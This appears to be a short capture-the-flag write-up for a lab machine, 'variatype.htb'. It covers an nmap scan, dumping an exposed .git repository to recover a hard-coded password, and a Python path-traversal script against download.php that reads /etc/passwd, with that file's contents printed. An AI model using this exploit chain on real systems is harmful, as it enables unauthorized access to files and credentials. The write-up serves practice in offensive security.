network recon:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

i find .git exposed:

```
ajdev@rootbox:~$ curl -s http://portal.variatype.htb/.git/HEAD
ref: refs/heads/master

then:

~$ pip3 install git-dumper --break-system-packages

ajdev@rootbox:~/repo$ ls
auth.php
ajdev@rootbox:~/repo$ ls -la
total 16
drwxrwxr-x  3 ajdev ajdev 4096 Mar 15 14:31 .
drwxr-x--- 42 ajdev ajdev 4096 Mar 15 14:31 ..
-rw-rw-r--  1 ajdev ajdev   36 Mar 15 14:31 auth.php
drwxrwxr-x  7 ajdev ajdev 4096 Mar 15 14:31 .git
ajdev@rootbox:~/repo$ git log --oneline --all
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
ajdev@rootbox:~/repo$ git diff HEAD~1 HEAD
diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

found subdomain:

```
portal.variatype.htb
```

login with that and redirect to:

```
http://portal.variatype.htb/dashboard.php
```

then:

``` 
#!/usr/bin/env python3
import sys
import requests


BASE_URL = "http://portal.variatype.htb"
USERNAME = "gitbot"
PASSWORD = "G1tB0t_Acc3ss_2025!"
TRAVERSAL = "....//" * 5


if len(sys.argv) != 2:
    print(f"usage: python {sys.argv[0]} /etc/passwd")
    sys.exit(1)

path = sys.argv[1].lstrip("/")

s = requests.Session()
s.post(f"{BASE_URL}/", data={"username": USERNAME, "password": PASSWORD})
r = s.get(f"{BASE_URL}/download.php", params={"f": TRAVERSAL + path})

print(r.text)
```

then:

```
ajdev@rootbox:~/HTB$ python3 solve.py /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
variatype:x:102:110::/nonexistent:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
```


